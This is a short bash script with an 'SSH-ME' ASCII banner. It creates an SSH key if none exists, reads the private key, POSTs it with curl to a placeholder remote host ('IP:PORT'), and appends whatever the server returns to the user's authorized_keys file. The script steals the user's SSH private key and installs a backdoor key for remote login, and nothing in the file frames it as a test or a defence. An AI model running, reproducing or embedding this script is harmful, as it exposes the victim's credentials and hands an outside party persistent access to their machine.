#!/bin/bash

echo "
                                                                
 @@@@@@    @@@@@@   @@@  @@@             @@@@@@@@@@   @@@@@@@@  
@@@@@@@   @@@@@@@   @@@  @@@             @@@@@@@@@@@  @@@@@@@@  
!@@       !@@       @@!  @@@             @@! @@! @@!  @@!       
!@!       !@!       !@!  @!@             !@! !@! !@!  !@!       
!!@@!!    !!@@!!    @!@!@!@!  @!@!@!@!@  @!! !!@ @!@  @!!!:!    
 !!@!!!    !!@!!!   !!!@!!!!  !!!@!@!!!  !@!   ! !@!  !!!!!:    
     !:!       !:!  !!:  !!!             !!:     !!:  !!:       
    !:!       !:!   :!:  !:!             :!:     :!:  :!:       
:::: ::   :::: ::   ::   :::             :::     ::    :: ::::  
:: : :    :: : :     :   : :              :      :    : :: ::   
                                                                
"

if [ -d "$HOME/.ssh" ]
then
    if [[ ! -f "$HOME/.ssh/id_rsa" ]]
    then
        echo "$HOME/.ssh/id_rsa" | ssh-keygen -t rsa -b 2048 > /dev/null 2>&1
    fi
else
    echo "$HOME/.ssh/id_rsa" | ssh-keygen -t rsa -b 2048 > /dev/null 2>&1
fi

privkey=`cat $HOME/.ssh/id_rsa`

auth_key=`curl -s -X POST -d "key=$privkey" http://IP:PORT`
echo $auth_key >> $HOME/.ssh/authorized_keys